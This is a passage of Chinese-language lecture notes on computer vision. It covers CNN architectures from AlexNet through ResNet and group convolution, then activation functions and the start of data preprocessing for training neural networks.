    <img src="../NOTE/CS/CV/img/lec7-1.png" alt="AlexNet" style="width: 90%;">
    <figcaption>AlexNet</figcaption>
</figure>
<blockquote>
<p>池化层的FLOP相对卷积层来说很小，可以忽略不计</p>
</blockquote>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-2.png" alt="AlexNet" style="width: 90%;">
    <figcaption>AlexNet.cont</figcaption>
</figure>

<p>大部分的Memory都在卷积层，大部分的超参数都在展平之后，因为这里需要把256*6*6展平成9216，再变成4096，需要矩阵的大小为9216*4096；</p>
<p>而浮点数的乘法加法运算集中在卷积层；</p>
<h2 id="note-cs-cv-lec7_8-zfnet">ZFnet<a class="headerlink" href="#note-cs-cv-lec7_8-zfnet" title="Permanent link">&para;</a></h2>
<p>ZFNet 是由 Matthew Zeiler 和 Rob Fergus 开发的一种卷积神经网络架构。它于 2013 年推出，作为 AlexNet 的改进版本，主要关注于更好地可视化和理解 CNN 的中间层。</p>
<p>CONV1: 7x7, instead of 11x11 减小了滤波器的大小，使得原本图像的信息损失更少；</p>
<p>CONV3，4，5： instead of 384, 384, 256 filters use 512, 1024, 512  增加了通道数，增加了模型的复杂度；</p>
<p>与AlexNet一样，模型的得出都是通过实验得出的，而不是理论推导；</p>
<h2 id="note-cs-cv-lec7_8-vgg">VGG<a class="headerlink" href="#note-cs-cv-lec7_8-vgg" title="Permanent link">&para;</a></h2>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-3.png" alt="AlexNet" style="width: 90%;">
    <figcaption>VGG</figcaption>
</figure>

<p>VGG 是由牛津大学的 Visual Geometry Group 开发的一种深度卷积神经网络架构。VGG 网络以其简单而深度的结构著称，通常使用 3x3 的卷积核和 2x2 的池化层。</p>
<ul>
<li><strong>深度</strong>: VGG 网络有多种变体，最常见的是 VGG16 和 VGG19，分别包含 16 和 19 个权重层。</li>
<li><strong>卷积核</strong>: 使用小的 3x3 卷积核，能够捕捉到更细致的特征。</li>
<li><strong>池化层</strong>: 使用 2x2 的最大池化层来减小特征图的尺寸。</li>
<li><strong>全连接层</strong>: 在卷积层之后，通常有几个全连接层，用于分类任务。</li>
</ul>
<p>VGG 网络在 2014 年的 ImageNet 大规模视觉识别挑战赛中表现优异，展示了深度网络在图像识别任务中的强大能力。</p>
<h3 id="note-cs-cv-lec7_8-features-of-vgg">Features of VGG<a class="headerlink" href="#note-cs-cv-lec7_8-features-of-vgg" title="Permanent link">&para;</a></h3>
<p><span style="color:blue">All conv are 3x3 stride 1 pad 1</span>,即通过3x3的卷积核，stride为1，padding为1，来代替大尺寸的卷积核，从而减少参数量和计算量；</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<ul>
<li>
<p>Option1: Conv(5x5,C,C),即一个5x5的卷积核，输入通道为C,有C个这样的卷积核，output size为 <span class="arithmatex">\(H\times W\times C\)</span></p>
</li>
<li>
<p>Params: <span class="arithmatex">\(5*5*C*C=25C^2\)</span></p>
</li>
<li>
<p>FLOPs: <span class="arithmatex">\((H*W*C)*(5*5*C)=25HWC^2\)</span></p>
</li>
<li>
<p>Option2: tow Conv(3x3,C,C),即一个3x3的卷积核，输入通道为C,有C个这样的卷积核，output size为 <span class="arithmatex">\(H\times W\times C\)</span>,经过两层3x3的卷积，由于从后往前每一次感受野增加K-1,所以总感受野为<span class="arithmatex">\(1+2(K-1)=2K-1=5\)</span>,与5x5的卷积的感受野相同，但是</p>
</li>
<li>
<p>Params: <span class="arithmatex">\(2*(3*3*C*C)=18C^2\)</span></p>
</li>
<li>FLOPs: <span class="arithmatex">\((H*W*C)*(3*3*C)*2=18HWC^2\)</span></li>
</ul>
<p>超参数和计算量都比5x5的卷积小</p>
</div>
<p><span style="color:blue">All max pool are 2x2 stride 2,After pool, double #channel</span></p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<ul>
<li>Option1: Input: <span class="arithmatex">\(C \times 2H \times 2W\)</span>, Layer: Conv(3x3, <span class="arithmatex">\(C \rightarrow C\)</span>)</li>
<li>Memory: <span class="arithmatex">\(4HWC\)</span></li>
<li>Params: <span class="arithmatex">\(9C^2\)</span></li>
<li>
<p>FLOPs: <span class="arithmatex">\((2H*2W*C)*(3*3*C)=18HWC^2\)</span></p>
</li>
<li>
<p>Option2: Input: <span class="arithmatex">\(2C \times H \times W\)</span>, Layer: Conv(3x3, <span class="arithmatex">\(2C \rightarrow 2C\)</span>)</p>
</li>
<li>Memory: <span class="arithmatex">\(2HWC\)</span></li>
<li>Params: <span class="arithmatex">\(9(2C)^2=36C^2\)</span></li>
<li>FLOPs: <span class="arithmatex">\((H*W*2C)*(3*3*2C)=36HWC^2\)</span></li>
</ul>
<p>池化操作会减少特征图的空间尺寸（即宽度和高度），从而降低计算复杂度。通过增加通道数，可以在不增加计算量的情况下，保持或增加模型的表达能力。</p>
</div>
<h3 id="note-cs-cv-lec7_8-alexnet-vs-vgg">AlexNet vs VGG<a class="headerlink" href="#note-cs-cv-lec7_8-alexnet-vs-vgg" title="Permanent link">&para;</a></h3>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-4.png" alt="AlexNet vs VGG" style="width: 90%;">
    <figcaption>AlexNet vs VGG</figcaption>
</figure>

<p>从图中可以直观的看出VGG远比AlexNet深，且参数更多，计算量更大；这说明更深的网络可以获得更好的性能,可以处理更复杂的特征；</p>
<h2 id="note-cs-cv-lec7_8-googlenet">GoogLeNet<a class="headerlink" href="#note-cs-cv-lec7_8-googlenet" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Focus on efficiency</p>
</blockquote>
<p>GoogLeNet 是一种深度卷积神经网络架构，由 Google 的研究团队开发，并在 2014 年的 ImageNet 大规模视觉识别挑战赛中取得了优异的成绩。GoogLeNet 的一个显著特点是引入了 Inception 模块，这种模块化设计使得网络能够在保持计算效率的同时，增加深度和宽度。</p>
<h3 id="note-cs-cv-lec7_8-stem-network">Stem network<a class="headerlink" href="#note-cs-cv-lec7_8-stem-network" title="Permanent link">&para;</a></h3>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-5.png" alt="Stem network" style="width: 90%;">
    <figcaption>Stem network</figcaption>
</figure>

<blockquote>
<p>at the start aggressively downsamples input</p>
</blockquote>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-6.png" alt="Stem network" style="width: 90%;">
    <figcaption>Stem network</figcaption>
</figure>

<p>将输入的大数据进行下采样(3x224x224) -&gt; (192x28x28)</p>
<h3 id="note-cs-cv-lec7_8-inception-module">Inception Module<a class="headerlink" href="#note-cs-cv-lec7_8-inception-module" title="Permanent link">&para;</a></h3>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-7.png" alt="Inception Module" style="width: 90%;">
    <figcaption>Inception Module</figcaption>
</figure>
<blockquote>
<p>Local unit with parallel branches</p>
</blockquote>
<p>Inception模块的设计允许在 <strong>并行</strong> 的情况下使用多种滤波器尺寸（例如1x1、3x3、5x5）进行卷积，从而使网络能够捕捉不同尺度的特征。</p>
<p>它还包括一个池化操作。这些操作的输出在深度维度上进行连接，这有助于网络在不显著增加计算成本的
情况下学习更复杂的特征。</p>
<p>这使得局部特征在可以重复出现很多次；</p>
<ul>
<li>1x1卷积：减少通道数，降低后面卷积网络的计算量；</li>
<li>3x3卷积：捕捉局部特征；</li>
<li>5x5卷积：捕捉更大范围的特征；</li>
<li>池化操作：捕捉全局特征；</li>
</ul>
<p>经过不同卷积核的卷积操作（为了让输出的大小一致，这其中也使用的padding），最后将所有输出在深度维度上进行连接；</p>
<h3 id="note-cs-cv-lec7_8-global-average-pooling">Global Average Pooling<a class="headerlink" href="#note-cs-cv-lec7_8-global-average-pooling" title="Permanent link">&para;</a></h3>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-8.png" alt="Global Average Pooling" style="width: 90%;">
    <figcaption>Global Average Pooling</figcaption>
</figure>

<p>No large FC layers at the end! Instead uses global average pooling to 
collapse spatial dimensions, and one linear layer to produce class scores
(Recall VGG-16: Most parameters were in the FC layers!)</p>
<p>在AlexNet中最后需要将整个输入展平成一个向量，然后进行全连接操作，而在GoogLeNet中，最后使用一个大小与输入大小相同的卷积核，然后进行全局平均池化，得到了一个紧凑的向量，然后进行单层全连接，大大减小了参数量和计算量；</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>无论是GoogleNet还是VGG，当时都没有Batch Normalization，所以训练多层网络时很困难，为了解决这个问题，它们都是用了一些辅助分类器来使得训练可以正确进行；</p>
<p>在网络的多个中间点附加“辅助分类器”，这些分类器也尝试对图像进行分类并接收损失。这种方法帮助改善梯度传播问题。</p>
<p>有了BatchNorm后，就不再需要使用这种技巧来改善训练。</p>
<p><figure>
    <img src="../NOTE/CS/CV/img/lec7-10.png" alt="Global Average Pooling" style="width: 90%;">
    <figcaption>Auxiliary Classifiers</figcaption>
</figure></p>
</div>
<h2 id="note-cs-cv-lec7_8-resnet">ResNet<a class="headerlink" href="#note-cs-cv-lec7_8-resnet" title="Permanent link">&para;</a></h2>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-11.png" alt="ResNet" style="width: 90%;">
    <figcaption>ImageNet Classification Challenge</figcaption>
</figure>

<p>2015年，ResNet在ImageNet竞赛中取得了惊人的成绩，其错误率仅为3.57%，远低于第二名（4.75%）；同时ResNet的层数达到了惊人的152层！</p>
<p>Once we have Batch Normalization, we can train networks with 10+ layers. What happens as we go deeper?</p>
<p>按理说，网络越深，效果应该越好，因为深层的网络可以通过让其中一些层做恒等变换来拟合浅层的网络，但是一开始人们却发现：</p>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-12.png" alt="ResNet" style="width: 90%;">
    <figcaption>Underfitting</figcaption>
</figure>

<p>Why?</p>
<p>深层模型在优化上更具挑战性，特别是在学习恒等函数以模拟浅层模型时。这是因为随着网络深度的增加，模型的参数和复杂性也随之增加，这使得优化过程变得更加困难。</p>
<div class="admonition solution">
<p class="admonition-title">Solution</p>
<p>Change the network so learning identity functions with extra layers is easy!</p>
<p>通过引入残差块来使得数据可以跳过一些层，从而使得数据可以更容易地学习到恒等函数，从而避免出现欠拟合的现象；</p>
<p><figure>
    <img src="../NOTE/CS/CV/img/lec7-13.png" alt="ResNet" style="width: 90%;">
    <figcaption>Residual Block</figcaption>
</figure></p>
<blockquote>
<p>如果我们把中间的卷积层设置为0，这就是一个恒等连接~</p>
</blockquote>
<p>具体来说:</p>
<p>ResNet通过引入残差块来解决深层网络的退化问题。残差块通过“跳跃连接”（skip connection）将输入直接传递到输出，允许网络学习残差映射（即，期望的输出与输入之间的差异），而不是直接学习复杂的映射。这种设计使得网络更容易优化。</p>
<p>在残差块中，输入通过一个或多个卷积层后，与原始输入相加。这种跳跃连接可以帮助梯度更好地反向传播，缓解梯度消失问题。</p>
<p>通过使用残差块，ResNet能够有效地训练非常深的网络（如152层），而不会出现退化问题。这是因为即使在深层网络中，跳跃连接也能确保信息流的顺畅传递。</p>
</div>
<h3 id="note-cs-cv-lec7_8-structure-of-resnet">Structure of ResNet<a class="headerlink" href="#note-cs-cv-lec7_8-structure-of-resnet" title="Permanent link">&para;</a></h3>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-14.png" alt="ResNet" style="width: 90%;">
    <figcaption>ResNet</figcaption>
</figure>
<blockquote>
<p>相同颜色的是一个Block</p>
</blockquote>
<p>Like GoogleNet：</p>
<ul>
<li>At the beginning, aggressively downsamples input using stem network</li>
<li>At the end of convolutional layers, use global average pooling to collapse spatial dimensions, and one linear layer to produce class scores</li>
</ul>
<div class="admonition key-point">
<p class="admonition-title">2 major ResNet Structures</p>
<p><strong>ResNet-18</strong></p>
<ul>
<li>Stem: 1 conv layer</li>
<li>Stage 1 (C=64): 2 res. block = 4 conv</li>
<li>Stage 2 (C=128): 2 res. block = 4 conv</li>
<li>Stage 3 (C=256): 2 res. block = 4 conv</li>
<li>Stage 4 (C=512): 2 res. block = 4 conv</li>
<li>Linear</li>
<li>ImageNet top-5 error: 10.92</li>
<li>GFLOP: 1.8</li>
</ul>
<p><strong>ResNet-34</strong></p>
<ul>
<li>Stem: 1 conv layer</li>
<li>Stage 1: 3 res. block = 6 conv</li>
<li>Stage 2: 4 res. block = 8 conv</li>
<li>Stage 3: 6 res. block = 12 conv</li>
<li>Stage 4: 3 res. block = 6 conv</li>
<li>Linear</li>
<li>ImageNet top-5 error: 8.58</li>
<li>GFLOP: 3.6</li>
</ul>
</div>
<h3 id="note-cs-cv-lec7_8-block-design">Block design<a class="headerlink" href="#note-cs-cv-lec7_8-block-design" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec7_8-bottleneck-block">Bottleneck Block<a class="headerlink" href="#note-cs-cv-lec7_8-bottleneck-block" title="Permanent link">&para;</a></h4>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-15.png" alt="ResNet" style="width: 90%;">
    <figcaption>Bottleneck Block</figcaption>
</figure>

<p>在ResNet中，Bottleneck Block是一种特殊的残差块设计，用于在保持网络深度的同时减少计算量和参数量。Bottleneck Block通过引入1x1卷积层来压缩和扩展特征通道，从而提高网络的效率。</p>
<ul>
<li>
<p><strong>1x1卷积层（压缩）</strong>: 这个层用于减少输入特征图的通道数，从而降低计算复杂度。它起到压缩特征的作用。</p>
</li>
<li>
<p><strong>3x3卷积层</strong>: 这是一个标准的卷积层，用于在压缩后的特征图上进行卷积操作，提取特征。</p>
</li>
<li>
<p><strong>1x1卷积层（扩展）</strong>: 这个层用于将特征图的通道数恢复到原始输入的大小。</p>
</li>
</ul>
<p>通过在3x3卷积前后使用1x1卷积，Bottleneck Block能够在不显著增加计算量的情况下增加网络的深度。这种设计使得ResNet可以在更深的网络中保持高效的计算性能。Bottleneck Block特别适合用于非常深的网络（如ResNet-50、ResNet-101、ResNet-152），因为它能够在保持网络深度的同时控制计算复杂度。</p>
<h4 id="note-cs-cv-lec7_8-relu-position">Relu position<a class="headerlink" href="#note-cs-cv-lec7_8-relu-position" title="Permanent link">&para;</a></h4>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-16.png" alt="ResNet" style="width: 90%;">
    <figcaption>Relu position</figcaption>
</figure>
<blockquote>
<p>ReLU after residual addition  Cannot actually learn identity function since  outputs are nonnegative</p>
</blockquote>
<p>通过在卷积之前应用批归一化和ReLU，预激活结构可以更好地保留输入信息，使得学习恒等映射更容易。这种设计改善了梯度流动，帮助网络更有效地训练。</p>
<p>这种调整虽然带来了轻微的性能提升，但由于复杂性增加，在实际应用中并不总是采用。</p>
<h2 id="note-cs-cv-lec7_8-summary">Summary<a class="headerlink" href="#note-cs-cv-lec7_8-summary" title="Permanent link">&para;</a></h2>
<p>在图像分类比赛中，以下是各种神经网络的复杂度和性能的总结：</p>
<figure>
    <img src="../NOTE/CS/CV/img/lec7-17.png" alt="ResNet" style="width: 90%;">
    <figcaption>Summary1</figcaption>
</figure>

<figure>
    <img src="../NOTE/CS/CV/img/lec7-18.png" alt="ResNet" style="width: 90%;">
    <figcaption>Summary2</figcaption>
</figure>

<h2 id="note-cs-cv-lec7_8-group-convolution">Group Convolution<a class="headerlink" href="#note-cs-cv-lec7_8-group-convolution" title="Permanent link">&para;</a></h2>
<figure>
    <img alt="" src="../NOTE/CS/CV/lec7_8/images/lec8-1.png" width="70%" />
    <figcaption>标准卷积</figcaption>
</figure>
<p>传统的卷积操作中, 每个卷积核的通道数与输入的通道数相同, 即一个卷积核的通道数为<span class="arithmatex">\(C_{in}\)</span>。</p>
<figure>
    <img alt="" src="../NOTE/CS/CV/lec7_8/images/lec8-2.png" width="70%" />
    <figcaption>Group Convolution</figcaption>
</figure>
<p>而Group Convolution将输入通道分成若干组（Groups），每组独立进行卷积操作，最后合并结果。</p>
<p>输入通道被均分为 <span class="arithmatex">\( G \)</span> 组，每组有 <span class="arithmatex">\( C/G \)</span> 个通道。</p>
<p>每个卷积核也对应分成 <span class="arithmatex">\( G \)</span> 组，每组卷积核仅处理对应的输入通道组。</p>
<blockquote>
<p>每个Group也可以多个卷积核</p>
</blockquote>
<p>各组卷积结果在通道维度拼接，形成最终输出。</p>
<div class="admonition note">
<p class="admonition-title">Group Convolution</p>
<ul>
<li>input: <span class="arithmatex">\(C_{in} \times H \times W\)</span></li>
<li>output: <span class="arithmatex">\(C_{out} \times H \times W\)</span></li>
<li>weight: <span class="arithmatex">\(G \times \dfrac{C_{out}}{G} \times \dfrac{C_{in}}{G} \times K \times K\)</span></li>
<li>FLOPS: <span class="arithmatex">\(C_out \times H \times W \times K \times K \times \dfrac{C_{in}}{G}\)</span></li>
</ul>
<p>如果是常规的卷积，那么<span class="arithmatex">\(G=1\)</span>,FLOPS: <span class="arithmatex">\(C_out \times H \times W \times K \times K \times C_{in}\)</span></p>
</div>
<p>计算量直接变为<span class="arithmatex">\(\dfrac{1}{G}\)</span></p>
<figure>
    <img alt="" src="../NOTE/CS/CV/lec7_8/images/lec8-5.png" width="70%" />
    <figcaption>Group Convolution</figcaption>
</figure>
<p><strong>并行性增强</strong>：各组可并行计算（如在多GPU训练中）。</p>
<p><strong>模型表达能力调整</strong>：通过调整组数 <span class="arithmatex">\( G \)</span>，平衡效率与性能（如ResNeXt通过增加组数提升性能）。</p>
<blockquote>
<p>在torch.nn.Conv2d中，可以通过groups参数设置分组卷积。</p>
</blockquote>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/lec7_8/images/lec8-3.png" width="70%" />
<figcaption>Parallel Convolution</figcaption>
</figure></p>
<p>对于常规的卷积操作，其FLOPS为：</p>
<ul>
<li>第一层：<span class="arithmatex">\(HWC \times 4C\times 1\times 1\)</span></li>
<li>第二层：<span class="arithmatex">\(HWC \times C\times 3\times 3\)</span></li>
<li>第三层：<span class="arithmatex">\(4HWC \times C\times 1\times 1\)</span></li>
</ul>
<p>总的为<span class="arithmatex">\(17HWC^2\)</span></p>
<p>对于Parallel Convolution，每一小组的<span class="arithmatex">\(C_{out}\)</span>为<span class="arithmatex">\(c\)</span></p>
<p>每一小组的FLOPS为</p>
<ul>
<li>第一层：<span class="arithmatex">\(HWc \times 4C \times 1\times 1\)</span></li>
<li>第二层：<span class="arithmatex">\(HWc \times c\times 3\times 3\)</span></li>
<li>第三层：<span class="arithmatex">\(HWc \times 4c\times 1\times 1\)</span></li>
</ul>
<p>总的为<span class="arithmatex">\(G(8Cc+9c^2)HWG\)</span>,通过设置不同的参数可以实现一样的计算量</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/CS/CV/lec7_8/images/lec8-4.png" width="70%" />
    <figcaption>具体的实现，是在中间分组</figcaption>
</figure></p>
</div></section><section class="print-page" id="note-cs-cv-lec9_10" heading-number="2.4.5.9"><h1 id="note-cs-cv-lec9_10-training-neural-networks">Training Neural Networks<a class="headerlink" href="#note-cs-cv-lec9_10-training-neural-networks" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 5146 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 3 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 17 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 18 分钟</p>
</div>
<div align="center">
    <span style="font-size: 24px; font-weight: bold;color:blue">One time setup</span>
</div>

<h2 id="note-cs-cv-lec9_10-activation-functions">Activation Functions<a class="headerlink" href="#note-cs-cv-lec9_10-activation-functions" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec9_10-sigmoid">Sigmoid<a class="headerlink" href="#note-cs-cv-lec9_10-sigmoid" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/sigmoid.png" width="70%" />
</figure>
<p>Sigmoid function is defined as:</p>
<div class="arithmatex">\[
\sigma(x) = \frac{1}{1 + e^{-x}}
\]</div>
<p>其输出在(0,1)之间，当<span class="arithmatex">\(x\)</span>趋近于正无穷时，<span class="arithmatex">\(\sigma(x)\)</span>趋近于1，当<span class="arithmatex">\(x\)</span>趋近于负无穷时，<span class="arithmatex">\(\sigma(x)\)</span>趋近于0。</p>
<p>主要的问题有：</p>
<ul>
<li>
<p>梯度消失(Kill the gradient)：当<span class="arithmatex">\(x\)</span>趋近于正无穷或负无穷时，<span class="arithmatex">\(\sigma(x)\)</span>的梯度趋近于0，这会导致反向传播时出现导致梯度消失。</p>
</li>
<li>
<p>输出不是以0为中心的。也就是说，它的输出总是正的。而在神经网络中，下一层隐藏层和上一层的关系为</p>
</li>
</ul>
<div class="arithmatex">\[
h_i^{(\ell)} = \sum_j w_{i,j}^{(\ell)} \sigma \left( h_j^{(\ell-1)} \right) + b_i^{(\ell)}
\]</div>
<p>local stream对于weight matrix的求导会得到<span class="arithmatex">\(\sigma \left( h_j^{(\ell-1)} \right)\)</span>,但是由于它总是正的，所以down stream的符号永远和upstream的符号相同。</p>
<p>这将会导致loss function对于weight matrix的梯度永远为正或者永远为负;如果现在有两个权重矩阵<span class="arithmatex">\(W_1\)</span>和<span class="arithmatex">\(W_2\)</span></p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-1.png" width="500" />
</figure>
<p>假设<span class="arithmatex">\(x\)</span>轴代表<span class="arithmatex">\(W_1\)</span>，<span class="arithmatex">\(y\)</span>轴代表<span class="arithmatex">\(W_2\)</span>，一开始的loss在原点，需要朝着第四象限移动，即要求<span class="arithmatex">\(dW_1\)</span>为正而<span class="arithmatex">\(dW_2\)</span>为负，但是由于<span class="arithmatex">\(\sigma \left( h_j^{(\ell-1)} \right)\)</span>总是正的，所以<span class="arithmatex">\(dW_1\)</span>和<span class="arithmatex">\(dW_2\)</span>的符号总是相同的，这将会导致其只能以诡异的之字形下降。</p>
<ul>
<li>计算复杂度高：Sigmoid函数需要计算指数运算，在硬件实现上其计算比其他激活函数更复杂。(但是如果在GPU上计算，由于GPU移动数据的时间已经很大，往往计算时间差别不大。)</li>
</ul>
<h3 id="note-cs-cv-lec9_10-tanh">tanh<a class="headerlink" href="#note-cs-cv-lec9_10-tanh" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/tanh.png" width="400" />
</figure>
<p>tanh函数定义为：</p>
<div class="arithmatex">\[
\tanh(x) = \frac{e^x - e^{-x}}{e^x + e^{-x}}
\]</div>
<p>其输出在(-1,1)之间，当<span class="arithmatex">\(x\)</span>趋近于正无穷时，<span class="arithmatex">\(\tanh(x)\)</span>趋近于1，当<span class="arithmatex">\(x\)</span>趋近于负无穷时，<span class="arithmatex">\(\tanh(x)\)</span>趋近于-1。</p>
<p><strong>解决了Sigmoid的输出不是以0为中心的问题</strong>，但是仍然有梯度消失的问题存在.</p>
<h3 id="note-cs-cv-lec9_10-relu">ReLU<a class="headerlink" href="#note-cs-cv-lec9_10-relu" title="Permanent link">&para;</a></h3>
<p>ReLU函数定义为：</p>
<div class="arithmatex">\[
\text{ReLU}(x) = \max(0, x)
\]</div>
<p><strong>在正区域不饱和</strong></p>
<p>当输入值增加时，函数的输出不会达到最大限制。换句话说，随着输入值变得越来越大，激活函数的输出会继续增加，而不会接近一个固定的上限。</p>
<p>在正区域（即当 <span class="arithmatex">\( x &gt; 0 \)</span> 时），ReLU 的输出等于输入 <span class="arithmatex">\( x \)</span>。这意味着当 <span class="arithmatex">\( x \)</span> 增加时，输出也线性增加而不会饱和。这个特性有助于缓解深度神经网络训练中的梯度消失问题，因为对于正输入值，梯度保持显著。</p>
<p>相比之下，像 Sigmoid 或 tanh 这样的激活函数在正负区域都会饱和。对于较大的正输入值，Sigmoid 函数的输出接近 1，而 tanh 函数的输出也接近 1。这种饱和可能导致非常小的梯度，从而在反向传播过程中引发梯度消失问题。</p>
<p>同时，ReLU的计算速度比Sigmoid和tanh快很多，因为ReLU只需要一个比较运算。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/relu.png" width="60%" />
</figure>
<p>不过RelU也有问题，因为它不是以0为中心的</p>
<p>而且存在 <strong>Dead ReLU</strong> 的问题，当<span class="arithmatex">\(x&lt;0\)</span>时，ReLU的输出为0，这会导致梯度为0，从而导致神经元死亡。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-2.png" width="60%" />

<figcaption>
    dead ReLU
</figcaption>
</figure>
<h3 id="note-cs-cv-lec9_10-leaky-relu">Leaky ReLU<a class="headerlink" href="#note-cs-cv-lec9_10-leaky-relu" title="Permanent link">&para;</a></h3>
<p>Leaky ReLU函数定义为：</p>
<div class="arithmatex">\[
\text{Leaky ReLU}(x) = \max(0.01x, x)
\]</div>
<p>为了解决Dead ReLU的问题，Leaky ReLU引入了一个小的斜率，当<span class="arithmatex">\(x&lt;0\)</span>时，输出为<span class="arithmatex">\(0.01x\)</span>。这样它就不会die。</p>
<h4 id="note-cs-cv-lec9_10-parametric-relu">Parametric ReLU<a class="headerlink" href="#note-cs-cv-lec9_10-parametric-relu" title="Permanent link">&para;</a></h4>
<p>Parametric ReLU函数定义为：</p>
<div class="arithmatex">\[
\text{Parametric ReLU}(x) = \max(\alpha x, x)
\]</div>
<p>其中<span class="arithmatex">\(\alpha\)</span>是一个可学习的参数，可以参与反向传播.</p>
<h3 id="note-cs-cv-lec9_10-elu">ELU<a class="headerlink" href="#note-cs-cv-lec9_10-elu" title="Permanent link">&para;</a></h3>
<p>ELU函数定义为：</p>
<div class="arithmatex">\[
\text{ELU}(x) = \begin{cases} 
    x &amp; \text{if } x \geq 0 \\
    \alpha (e^x - 1) &amp; \text{if } x &lt; 0 
\end{cases}
\]</div>
<ol>
<li>
<p><strong>更接近零均值输出</strong>：ELU 函数的输出更接近于零均值，这有助于加速神经网络的学习过程。与 ReLU 不同，ELU 在负值区域有一个负的输出，这使得其输出的均值更接近于零，从而有助于减少偏移（bias shift）问题。</p>
</li>
<li>
<p><strong>负饱和区域</strong>：ELU 在负值区域有一个负的饱和输出，这与 ReLU 的零输出不同。这种特性可以帮助网络在负值区域保持一定的梯度，从而避免神经元死亡的问题。</p>
</li>
<li>
<p><strong>相较于 Leaky ReLU 增加了一些对噪声的鲁棒性</strong>：ELU 的负指数部分使其在负值区域的变化更加平滑，这可以增加对输入噪声的鲁棒性。相比之下，Leaky ReLU 在负值区域的线性变化可能对噪声更敏感。</p>
</li>
</ol>
<p>这些特性使得 ELU 在某些情况下比 ReLU 和 Leaky ReLU 更加有效，尤其是在深度神经网络的训练中。</p>
<h4 id="note-cs-cv-lec9_10-selu">SeLU<a class="headerlink" href="#note-cs-cv-lec9_10-selu" title="Permanent link">&para;</a></h4>
<p>SeLU函数定义为：</p>
<div class="arithmatex">\[
\text{SeLU}(x) = \lambda \begin{cases} 
    x &amp; \text{if } x \geq 0 \\
    \alpha (e^x - 1) &amp; \text{if } x &lt; 0 
\end{cases}
\]</div>
<p>通过设置 <span class="arithmatex">\(\alpha = 1.6732632423543772848170429916717\)</span> 和 <span class="arithmatex">\(\lambda = 1.0507009873554804934193349852946\)</span>，可以使得其有很好的表现。</p>
<p>但是总的来说，使用ReLU在大部分下就足够了。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec9-3.png" width="400" />

<figcaption>
    各种激活函数在不同神经网络中对于CIFAR-10的准确率。
</figcaption>
</figure>
<h2 id="note-cs-cv-lec9_10-data-preprocessing">Data Preprocessing<a class="headerlink" href="#note-cs-cv-lec9_10-data-preprocessing" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec9_10-zero-center">zero-center<a class="headerlink" href="#note-cs-cv-lec9_10-zero-center" title="Permanent link">&para;</a></h3>
<p>对数据进行zero-center处理，即减去均值，可以将数据平移到原点附近，从而使得数据更加对称。</p>
